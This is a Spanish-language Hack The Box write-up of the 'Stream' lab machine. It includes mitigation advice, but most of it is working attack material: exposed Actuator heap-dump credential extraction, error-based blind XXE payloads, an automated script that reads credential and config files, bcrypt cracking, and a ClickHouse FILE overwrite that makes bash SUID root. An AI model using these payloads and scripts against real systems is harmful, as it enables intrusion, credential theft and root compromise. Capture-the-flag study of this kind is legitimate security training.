---
title: Stream
description: Stream es una máquina Linux media, que simula una infraestructura de aeropuerto con una API de ingesta de vuelos "AIDX" y una base de datos ClickHouse. La ruta de ataque encadena la exposición de Spring Boot Actuator "heap dump" para obtener credenciales, un Blind XXE en el endpoint de ingesta XML para leer archivos internos y escalar a SSH, y finalmente se abusa del privilegio FILE de ClickHouse para sobrescribir un script Python ejecutado como root por un servicio systemd, obteniendo una shell con SUID bash y acceso root.
date: 2026-10-11
toc: true
pin: false
image: assets/img/htb-writeup-stream/stream.png
categories:
  - Hack The Box
  - Machines
  - Linux
tags:
  - linux
  - Spring_Boot_Actuator
  - ClickHouse
  - Blind_XXE
  - ssh
  - ClickHouse_FILE
  - SUID_bash
---
## Resumen

## 1. Enumeración inicial

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn x.x.x.x -oG allports
```


Puertos abiertos:

```
22/tcp    ssh     OpenSSH 9.6p1 Ubuntu
80/tcp    http    nginx 1.24.0
8081/tcp  http    Uvicorn (AIDX flight-leg ingest API)
33363/tcp tcpwrapped
```


Añadimos los vhosts:

```bash
echo "x.x.x.x api.htb-airport.htb db.htb-airport.htb htb-airport.htb" | sudo tee -a /etc/hosts
```

---


## 2. Spring Boot Actuator → Heap dump

En `http://api.htb-airport.htb/actuator` encontramos el heap dump expuesto, ejecutar por separado.

```bash
curl -s http://api.htb-airport.htb/actuator | jq

wget http://api.htb-airport.htb/actuator/heapdump -O heapdump.hprof
```


Extraemos credenciales con `strings` (MAT falla en Arch sin WebKit, pero `strings` + `grep` es suficiente):

```bash
strings heapdump.hprof | grep -E "DB_PASSWORD|DB_USERNAME|CLICKHOUSE" -A 30 -B 30 | \
  grep -v -E "java|spring|class|org|com|framework"
```


Resultado clave:

```text
jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1
setUsername svc_events
setPassword Yl4aCgh4y2PnU
```

**Credenciales ClickHouse:** `svc_events : Yl4aCgh4y2PnU`

---


## 3. acceso a clickHouse


Interfaz HTTP detrás de Nginx, vhost `db.htb-airport.htb`:

```bash
curl -u svc_events:Yl4aCgh4y2PnU "http://db.htb-airport.htb/?query=SHOW%20DATABASES"

# partner_feed


curl -u svc_events:Yl4aCgh4y2PnU "http://db.htb-airport.htb/?query=SHOW%20TABLES%20FROM%20partner_feed"

# flightleg_json, flightleg_json_kafka, flightleg_json_mv
# flightleg_raw,  flightleg_raw_kafka,  flightleg_raw_mv
```


Estructura de `flightleg_json`:

```bash
curl -u svc_events:Yl4aCgh4y2PnU "http://db.htb-airport.htb/?query=DESCRIBE%20TABLE%20partner_feed.flightleg_json"

# transaction_id, originator, message_type, version, msg_timestamp,
# airline, flight_number, departure_airport, arrival_airport,
# origin_date, repeat_number, operational_status, event, ingested
```

La vista materializada usa `JSONExtractString(raw, 'originator')`, etc. Los datos no reconocidos se guardan en `all_fields.LegIdentifier`.

---


## 4. Blind XXE en `/feeds/aidx`

**Documentación:** `http://api.htb-airport.htb:8081/docs` (Swagger UI).

**Endpoint:** `POST http://api.htb-airport.htb:8081/feeds/aidx` con `Content-Type: application/xml`.

Respuesta: `{"accepted":true,"topic":"aidx.flightleg.raw.v1"}` → se encola en Kafka y el parser downstream (asíncrono) lo procesa.


### 4.1. Verificar Blind XXE

Payload Error-Based:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator>test</Originator>
  <FlightLeg>
    <LegIdentifier>test</LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```


```bash
curl -sk -X POST http://api.htb-airport.htb:8081/feeds/aidx \
  -H "Content-Type: application/xml" --data @payload.xml
  
sleep 5

curl -u svc_events:Yl4aCgh4y2PnU "http://db.htb-airport.htb/?query=SELECT%20event%20FROM%20partner_feed.flightleg_json%20ORDER%20BY%20ingested%20DESC%20LIMIT%201"
```

El contenido de `/etc/passwd` aparece en `all_fields.LegIdentifier`. **Blind XXE confirmado.**


### 4.2. Directorio de Kafka

  El **[[#Script — kafka_attack.sh]]**  "anexo" probando rutas. Se exfiltra `/etc/systemd/system/kafka.service`:

```ini
[Service]
User=svc-infra
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```


### 4.3. Credenciales de Kafka

Lectura de `/opt/kafka_2.13-4.3.1/config/server.properties`:

```properties
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
```

**Credenciales SSH:** `svc-infra : Ny2hdpme$bwT3` (o `svc_infra`)

---


## 5. Foothold: SSH

```bash
ssh svc-infra@10.129.14.213

# Password: Ny2hdpme$bwT3
```

Desde aquí pivotamos a `martin_cole`. 


## 6. Enum de Kafka


### 6.1. Localización de las herramientas de Kafka


Durante la fase inicial de enumeración desde la cuenta `svc-infra`, se identificó la instalación de Kafka en:

```
/opt/kafka_2.13-4.3.1/
```


Las herramientas de administración y consumo de mensajes se encontraban en:

```
/opt/kafka_2.13-4.3.1/bin/
```


Se utilizaron las herramientas de línea de comandos de Kafka para enumerar los topics disponibles y comprobar qué información podía obtenerse del broker local.

El servidor Kafka estaba accesible en:

```
127.0.0.1:9092
```


### 6.2. Identificación del topic de identidades

Entre los topics relevantes se identificó:

```
aidx.identity.json.v1
```


El nombre del topic sugería que contenía registros JSON relacionados con identidades. Se intentó consumir sus mensajes utilizando el cliente de Kafka sin autenticación.

La operación devolvió:

```
TOPIC_AUTHORIZATION_FAILED
```

Esto indicó que la sesión actual no tenía autorización para consumir el topic. No significaba que el topic estuviera vacío, sino que era necesario identificar un mecanismo de autenticación válido.


### 6.3. Autenticación contra Kafka

Al investigar la configuración de autenticación del broker. Se identificó el uso de SASL/PLAIN y se preparó un archivo de propiedades para el cliente:

```
cat > /tmp/kafka-client.properties <<'EOF'
security.protocol=SASL_PLAINTEXT
sasl.mechanism=PLAIN
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required username="svc_infra" password="<CONTRASEÑA_REDACTADA>";
EOF
```

Una vez configurado el cliente con la identidad `svc_infra`, fue posible acceder al topic de identidades.


### 6.4. Extracción del registro

el topic autenticado utilizando las herramientas de Kafka:

```
/opt/kafka_2.13-4.3.1/bin/kafka-console-consumer.sh \
  --bootstrap-server 127.0.0.1:9092 \
  --consumer.config /tmp/kafka-client.properties \
  --topic aidx.identity.json.v1 \
  --from-beginning
```


Entre los registros obtenidos apareció una identidad correspondiente a:

```
martin_cole
```


El registro incluía un hash de contraseña bcrypt:

```
$2b$12$/RNAvZeJj2E16wOLNg9wYOQSY8rpS1Pg3Zy57z9fhB371E0SrYD2y
```

Este hallazgo es relevante porque el topic contenía información de autenticación que permitía intentar recuperar la contraseña mediante un ataque offline al hash.


### 6.5. Hashcat

Hashcat en modo `3200` para hashes bcrypt.

en ataque de diccionario con la wordlist `rockyou.txt`:

```bash
hashcat -m 3200 -a 0 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

Donde:

- `-m 3200`: selecciona el formato bcrypt.

- `-a 0`: ejecuta un ataque de diccionario.

- `hash`: contiene el hash extraído del registro JSON.

- `rockyou.txt`: contiene las contraseñas candidatas.


Hashcat recuperó una contraseña candidata que coincidía con el hash. La contraseña obtenida fue:

```bash
tinkerbell
```


permitió pasar de una identidad descubierta en Kafka a una credencial utilizable para probar el acceso SSH de `martin_cole`.


> [!important] Alcance de la evidencia  
> La recuperación del hash demuestra que la contraseña era vulnerable al ataque de diccionario utilizado. No demuestra, por sí sola, que la contraseña se reutilizara en otros servicios; eso se comprobó mediante el intento de autenticación SSH.


### 6.6. Acceso por SSH

```bash
ssh martin_cole@stream
```
En el home de `martin_cole` encontramos una copia de seguridad de la herramienta ``Kopia`` con logs de ClickHouse:


## Exfiltración

### Identificar el repositorio

Se encontró un repositorio de Kopia en:

```bash
/home/martin_cole/backups
```

Se configuró una conexión de solo lectura, utilizando un archivo de configuración temporal y una caché independiente.

```
kopia --config-file=/tmp/kopia-martin.repository.config repository connect filesystem \
  --path=/home/martin_cole/backups \
  --readonly \
  --cache-directory=/tmp/kopia-martin-cache
```


**Resultado registrado:**

```
Enter password to open repository:
Connected to repository.
```

La conexión permitió consultar las instantáneas almacenadas sin modificar intencionalmente el repositorio.


### Enumerar las instantáneas

```
kopia --config-file=/tmp/kopia-martin.repository.config snapshot list --all
```


**Resultado relevante:**

```
martin_cole@stream:/home/martin_cole/ch-logs
2026-08-25 10:21:17 UTC
kc43a7ec76aeac204b305df2b777304d1
1.4 MB
```


Se identificó una instantánea correspondiente a los registros del servidor ClickHouse.

- **Origen:** `/home/martin_cole/ch-logs`

- **Instantánea:** `kc43a7ec76aeac204b305df2b777304d1`

- **Fecha:** 25 de agosto de 2026, 10:21:17 UTC

- **Tamaño mostrado:** aproximadamente 1,4 MB


### Enumerar los archivos de la instantánea

```
kopia --config-file=/tmp/kopia-martin.repository.config \
  list --recursive --long kc43a7ec76aeac204b305df2b777304d1
```


**Resultado relevante:**

```
clickhouse-server.log       1376075 bytes
clickhouse-server.err.log      9565 bytes
```

Los dos archivos eran interesantes para investigar la actividad y los errores de autenticación de ClickHouse.


### Restaurar /tmp

```
mkdir -p /tmp/ch-logs

kopia --config-file=/tmp/kopia-martin.repository.config \
  snapshot restore kc43a7ec76aeac204b305df2b777304d1 \
  /tmp/ch-logs-snapshot
```


los archivos de la instantánea quedan disponibles en `/tmp/ch-logs`. La salida exacta de la restauración no quedó registrada en el historial.

Verificar los archivos restaurados:

```
find /tmp/ch-logs -type f -printf '%p %s bytes\n'
```


### indicios en los registros

```
cd /tmp/ch-logs

grep -nEi \
  'DynamicQueryHandler|HTTPHandler|executeQuery|Access denied|AUTHENTICATION_FAILED|ALTER USER|CREATE USER|GRANT' \
  clickhouse-server.log clickhouse-server.err.log | head -100
```


**Hallazgo relevante registrado:**

```
ALTER USER default IDENTIFIED BY "N3v3rs33nD4T4"
```

El registro mostraba una consulta `ALTER USER` malformada asociada al procesamiento HTTP. La línea, por sí sola, no demuestra que el cambio de contraseña se ejecutara correctamente.


### Validacion

Se comprobó si la contraseña identificada permitía autenticarse en el servicio ClickHouse local:

```
clickhouse-client \
  --host 127.0.0.1 \
  --port 9000 \
  --user default \
  --ask-password
```


Introducir la contraseña cuando el cliente la solicite.

Consulta de validación:

```
SELECT currentUser(), version();
```

**Resultado registrado:**

```
default    26.8.1.1746
```

La autenticación tuvo éxito como `default` en ClickHouse `26.8.1.1746`.

---


## 7. Escalada: ClickHouse FILE → SUID bash


### 7.1. Confirmar privilegios de `default` en ClickHouse

```bash
clickhouse-client --host 127.0.0.1 --port 9000 --user default --ask-password --query "SHOW GRANTS" | grep -Ei 'FILE|CREATE|ALTER|SOURCES'
```

`default` tiene privilegio `FILE` → puede leer/escribir archivos en `user_files`.


### 7.2. Identificar el servicio privilegiado

```bash
systemctl show aidx-dlq-drainer.service -p User -p ExecStart

# User=root
# ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

El drainer ejecuta `/var/lib/clickhouse/user_files/aidx_quarantine.py` como root cada 2 minutos (vía timer systemd).


### 7.3. Backup del formateador original

```bash
clickhouse-client --host 127.0.0.1 --port 9000 --user default --ask-password --query "INSERT INTO TABLE FUNCTION file('aidx_quarantine.py.bak', 'RawBLOB', 'data String') SELECT file('aidx_quarantine.py')"
```


### 7.4. Payload

```bash

cat > /tmp/aidx_suid_bash.py <<'PY'
import sys, subprocess, os

raw = sys.stdin.buffer.read()
status = "SUID_FAIL"

try:
    subprocess.run(["chmod", "u+s", "/bin/bash"], check=True)
    if os.stat("/bin/bash").st_mode & 0o4000:
        status = "SUID_OK"
except Exception as e:
    status = f"ERR:{e}"

status = status.replace("\n", " ").replace("\r", " ").replace("\t", " ")
print(f"{len(raw)}\tROOT_SUID\t{status}")
PY



---

PAYLOAD=$(base64 -w0 /tmp/aidx_suid_bash.py)

---


---


clickhouse-client \
  --host 127.0.0.1 --port 9000 \
  --user default --ask-password \
  --query "INSERT INTO TABLE FUNCTION file('aidx_quarantine.py', 'RawBLOB', 'data String') SELECT base64Decode('$PAYLOAD') SETTINGS engine_file_truncate_on_insert = 1"
  
  
---

```



### 7.5. Disparar el drainer (mensaje DLQ)

```bash

python3 - <<'PY'
from confluent_kafka import Producer
p = Producer({"bootstrap.servers": "localhost:9092"})
p.produce("aidx.flightleg.raw.v1", value=b"<broken/>")
remaining = p.flush(10)
print("Mensajes pendientes:", remaining)
PY

```

Esperar ≤ 2 minutos y verificar:


```bash

clickhouse-client \
  --host 127.0.0.1 --port 9000 \
  --user default --ask-password \
  --query "SELECT received_at, root_tag, preview FROM aidx_ops.failed_ingest WHERE root_tag = 'ROOT_SUID' ORDER BY received_at DESC LIMIT 5 FORMAT Vertical"


---

ls -la /bin/bash   # -> -rwsr-xr-x

---

```


### 7.6. Root

```bash
bash -p
id
# uid=0(root) gid=0(root) groups=0(root)
```
---


## 9. Causa raíz

1. **Actuator expuesto** → heap dump filtrado con credenciales de BD.
2. **Blind XXE** en la ingesta de XML → lectura arbitraria de archivos.
3. **ClickHouse `default` con privilegio `FILE`** → escritura en `user_files`.
4. **Código ejecutable en `user_files`** ejecutado por servicio `root` → RCE como root.
5. **Credenciales en texto plano** en `server.properties` y logs → movimiento lateral.
---



## 10. Mitigaciones

- **Spring Boot:** deshabilitar `management.endpoints.web.exposure.include=*`, proteger `heapdump` con autenticación.

- **XML:** deshabilitar DTDs externas (`XMLConstants.FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`).

- **ClickHouse:** revocar `FILE` y privilegios admin de `default`; usar roles con mínimo privilegio.

- **Systemd:** ejecutar `aidx-dlq-drainer.service` como usuario sin privilegios; no ejecutar código desde `user_files`.

- **Rotación:** cambiar todas las credenciales expuestas.

- **Auditoría:** monitorizar escrituras en `user_files` y ejecuciones de Python desde servicios root.

---


## ## 11. Anexo:


## Script — kafka_attack.sh

Automatiza el envío de payloads Error-Based XXE contra múltiples rutas, guarda payloads, respuestas HTTP y resultados de ClickHouse en `./xxe-results-<timestamp>/`. Es la herramienta que permitió descubrir el directorio de Kafka y extraer `server.properties`.

- **Variables editables** al inicio: `TARGET_URL`, `CH_HOST`, `CH_USER`, `CH_PASS`, `WAIT_SECONDS`, `POLL_INTERVAL`.

- **Modo diagnóstico:** `./kafka_attack.sh diagnostic` → prueba solo `/etc/hostname`.

- **Modo scan (por defecto):** prueba toda la lista `RUTAS`.

- **Evidencias:** se guardan en `./xxe-results-<timestamp>/` con subcarpetas de payloads, respuestas, resultados y `report.log`.

- **Diferencia direct vs error:**

   `direct` → expansión de entidad directa en `LegIdentifier`. 
   `error` → Error-Based XXE (el mensaje de error contiene el archivo).

```bash
#!/usr/bin/env bash
# ============================================================
# HTB Stream - Blind XXE: diagnóstico y pruebas por etapas
# Métodos: expansión directa y Error-Based
# Guarda payloads, respuestas HTTP y resultados de ClickHouse.
#
# Uso:
#   chmod +x attack_candidates.sh
#   ./attack_candidates.sh
#
# Solo prueba sistemas donde tengas autorización.
# ============================================================

set -uo pipefail
umask 077

# ---------------- CONFIGURACIÓN ----------------

TARGET_URL="${TARGET_URL:-http://api.htb-airport.htb:8081/feeds/aidx}"
CH_HOST="${CH_HOST:-http://db.htb-airport.htb}"
CH_USER="${CH_USER:-svc_events}"
CH_PASS="${CH_PASS:-Yl4aCgh4y2PnU}"

WAIT_SECONDS="${WAIT_SECONDS:-8}"
POLL_INTERVAL="${POLL_INTERVAL:-2}"
MODE="${1:-scan}"

# ---------------- PREPARACIÓN ------------------

for cmd in curl python3; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "[!] Falta la dependencia: $cmd"
        exit 1
    fi
done

if ! [[ "$WAIT_SECONDS" =~ ^[0-9]+$ ]] ||
   ! [[ "$POLL_INTERVAL" =~ ^[1-9][0-9]*$ ]]; then
    echo "[!] WAIT_SECONDS debe ser >= 0 y POLL_INTERVAL > 0."
    exit 1
fi

OUT="./xxe-results-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT"

RUN_ID="stream_$(date +%s)_${RANDOM}"
SEQ=0
EVENT_HITS=0

DB_URL="${CH_HOST%/}/"
HEALTH_URL="${TARGET_URL%/feeds/aidx}/health"

# ---------------- RUTAS CANDIDATAS -------------

RUTAS=(
    "file:///etc/hostname"
    "file:///etc/passwd"

    "file:///etc/kafka/kafka_server_jaas.conf"
    "file:///etc/kafka/kafka_client_jaas.conf"
    "file:///etc/kafka/server_jaas.conf"
    "file:///etc/kafka/jaas.conf"
    "file:///etc/kafka/server.properties"

    "file:///opt/kafka/config/kafka_server_jaas.conf"
    "file:///opt/kafka/config/kafka_client_jaas.conf"
    "file:///opt/kafka/config/jaas.conf"
    "file:///opt/kafka/config/server.properties"

    "file:///usr/local/kafka/config/kafka_server_jaas.conf"
    "file:///usr/local/kafka/config/server.properties"
    "file:///usr/share/kafka/config/server.properties"
    "file:///var/lib/kafka/config/server.properties"

    "file:///home/kafka/config/kafka_server_jaas.conf"
    "file:///home/svc-infra/kafka/config/kafka_server_jaas.conf"
    "file:///home/svc-infra/kafka/config/jaas.conf"
    "file:///home/svc-infra/.config/kafka/jaas.conf"

    "file:///etc/default/kafka"
    "file:///etc/sysconfig/kafka"
    "file:///etc/systemd/system/kafka.service"

    "file:///app/application.properties"
    "file:///app/application.yml"
    "file:///app/application.yaml"
    "file:///app/config/application.properties"
    "file:///app/config/application.yml"

    "file:///opt/app/application.properties"
    "file:///opt/app/application.yml"
    "file:///opt/app/config/application.properties"

    "file:///workspace/application.properties"
    "file:///home/svc-infra/application.properties"
    "file:///home/svc-infra/app/application.properties"
    "file:///srv/app/application.properties"

    "file:///proc/self/cmdline"
    "file:///proc/self/status"

    "jar:file:///app/app.jar!/BOOT-INF/classes/application.properties"
    "jar:file:///app/app.jar!/BOOT-INF/classes/application.yml"
    "jar:file:///app/application.jar!/BOOT-INF/classes/application.properties"

    "jar:file:///opt/app/app.jar!/BOOT-INF/classes/application.properties"
    "jar:file:///opt/app/app.jar!/BOOT-INF/classes/application.yml"
    "jar:file:///opt/app/application.jar!/BOOT-INF/classes/application.properties"

    "jar:file:///app/app.jar!/application.properties"
    "jar:file:///opt/app/app.jar!/application.properties"
)

# ---------------- FUNCIONES --------------------

log() {
    printf '[%s] %s\n' "$(date '+%H:%M:%S')" "$*" |
        tee -a "$OUT/report.log"
}

db_query() {
    local sql="$1"

    curl -fsS \
        --connect-timeout 5 \
        --max-time 15 \
        --user "$CH_USER:$CH_PASS" \
        --get "$DB_URL" \
        --data-urlencode "query=$sql"
}

pretty_print() {
    python3 -c '
import json
import sys

for line in sys.stdin:
    line = line.rstrip("\n")
    if not line:
        continue
    try:
        obj = json.loads(line)
        print(json.dumps(obj, ensure_ascii=False, indent=2))
    except Exception:
        print(line)
'
}

check_prerequisites() {
    log "Directorio de resultados: $OUT"
    log "API: $TARGET_URL"
    log "ClickHouse: $CH_HOST"

    local http_code="000"

    http_code="$(
        curl -sS \
            --connect-timeout 5 \
            --max-time 10 \
            -o "$OUT/api-health.txt" \
            -w '%{http_code}' \
            "$HEALTH_URL" 2>>"$OUT/curl-errors.log"
    )" || http_code="000"

    if [[ "$http_code" == "000" ]]; then
        log "ERROR: API inaccesible. Revisa VPN, DNS y conectividad."
        return 1
    fi

    log "API accesible. HTTP $http_code"

    local db_check=""
    db_check="$(db_query 'SELECT 1 FORMAT TabSeparatedRaw' 2>&1)" || {
        log "ERROR: no se pudo consultar ClickHouse: $db_check"
        return 1
    }

    if [[ "$(printf '%s' "$db_check" | tr -d '[:space:]')" != "1" ]]; then
        log "ERROR: ClickHouse no devolvió el resultado esperado."
        log "$db_check"
        return 1
    fi

    log "ClickHouse responde correctamente."
    return 0
}

submit_payload() {
    local payload="$1"
    local response="$2"
    local code="000"

    code="$(
        curl -sS \
            --connect-timeout 5 \
            --max-time 15 \
            -o "$response" \
            -w '%{http_code}' \
            -H 'Content-Type: application/xml' \
            --data-binary "@$payload" \
            "$TARGET_URL" 2>>"$OUT/curl-errors.log"
    )" || code="000"

    printf '%s' "$code"
}

run_probe() {
    local method="$1"
    local uri="$2"
    local label="$3"

    SEQ=$((SEQ + 1))

    local id
    printf -v id '%03d' "$SEQ"

    local marker="${RUN_ID}_${id}"
    local payload="$OUT/payload_${id}.xml"
    local response="$OUT/response_${id}.txt"
    local result_file="$OUT/result_${id}.txt"
    local raw_file="$OUT/raw_${id}.txt"

    log "------------------------------------------------------------"
    log "Prueba $id | Método: $method"
    log "Candidato: $uri"

    if [[ "$method" == "direct" ]]; then
        cat >"$payload" <<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "$uri">
]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator>${marker}</Originator>
  <FlightLeg>
    <LegIdentifier>&xxe;__END_${marker}</LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
XML

    elif [[ "$method" == "error" ]]; then
        cat >"$payload" <<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY % file SYSTEM "$uri">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/${marker}/%file;'>">
  %eval;
  %error;
]>
<IATA_AIDX_FlightLegNotifRQ>
  <Originator>${marker}</Originator>
  <FlightLeg>
    <LegIdentifier>${marker}_ERROR</LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
XML

    else
        log "Método desconocido: $method"
        return 1
    fi

    local http_code
    http_code="$(submit_payload "$payload" "$response")"
    log "Respuesta HTTP: $http_code"

    local attempts=$(( (WAIT_SECONDS + POLL_INTERVAL - 1) / POLL_INTERVAL ))
    local attempt=0
    local event=""

    while (( attempt <= attempts )); do
        local sql="
            SELECT toString(event)
            FROM partner_feed.flightleg_json
            WHERE position(toString(event), '${marker}') > 0
            ORDER BY ingested DESC
            LIMIT 3
            FORMAT TabSeparatedRaw
        "

        event="$(db_query "$sql" 2>/dev/null)" || event=""

        if [[ -n "$event" && "$event" == *"$marker"* ]]; then
            printf '%s\n' "$event" >"$result_file"
            EVENT_HITS=$((EVENT_HITS + 1))

            log "Evento correlacionado con el marcador $marker."
            log "Resultado guardado en: $result_file"
            printf '%s\n' "$event" | pretty_print
            break
        fi

        if (( attempt < attempts )); then
            sleep "$POLL_INTERVAL"
        fi

        attempt=$((attempt + 1))
    done

    local raw_sql="
        SELECT raw
        FROM partner_feed.flightleg_raw
        WHERE position(raw, '${marker}') > 0
        ORDER BY ingested DESC
        LIMIT 1
        FORMAT TabSeparatedRaw
    "

    local raw_count_sql="
        SELECT count()
        FROM partner_feed.flightleg_raw
        WHERE position(raw, '${marker}') > 0
        FORMAT TabSeparatedRaw
    "

    local raw=""
    local raw_count=""

    raw="$(db_query "$raw_sql" 2>/dev/null)" || raw=""
    raw_count="$(db_query "$raw_count_sql" 2>/dev/null)" || raw_count=""

    printf '%s\n' "$raw" >"$raw_file"
    raw_count="$(printf '%s' "$raw_count" | tr -d '[:space:]')"

    if [[ -n "$event" && "$event" == *"$marker"* ]]; then
        log "Estado: el evento JSON existe. Revisa LegIdentifier y el contenido."
    elif [[ "$raw_count" =~ ^[0-9]+$ ]] && (( raw_count > 0 )); then
        log "Estado: el XML aparece en flightleg_raw, pero no se encontró evento coincidente."
        log "Esto puede indicar un fallo de parseo, transformación o inserción JSON."
        log "XML original guardado en: $raw_file"
    elif [[ "$raw_count" == "0" ]]; then
        log "Estado: el marcador no aparece en flightleg_raw."
        log "La ingesta pudo fallar, estar pendiente o usar un flujo diferente."
    else
        log "Estado: no fue posible determinar el estado de la tabla raw."
        log "Revisa los errores de ClickHouse y los permisos de consulta."
    fi
}

# ---------------- EJECUCIÓN --------------------

echo
echo "============================================================"
echo " HTB Stream - Diagnóstico Blind XXE"
echo "============================================================"

check_prerequisites || exit 1

if [[ "$MODE" == "diagnostic" ]]; then
    log "Modo de diagnóstico: se probará solamente /etc/hostname."
    run_probe direct "file:///etc/hostname" "hostname-direct"
    run_probe error  "file:///etc/hostname" "hostname-error"
else
    log "Modo scan: ${#RUTAS[@]} candidatos."
    log "Cada candidato se probará por expansión directa y Error-Based."

    for uri in "${RUTAS[@]}"; do
        run_probe direct "$uri" "direct"
        run_probe error "$uri" "error"
    done
fi

echo
log "============================================================"
log "Pruebas terminadas."
log "Total de intentos: $SEQ"
log "Eventos que coincidieron con un marcador: $EVENT_HITS"
log "Evidencias guardadas en: $OUT"
log "============================================================"
```
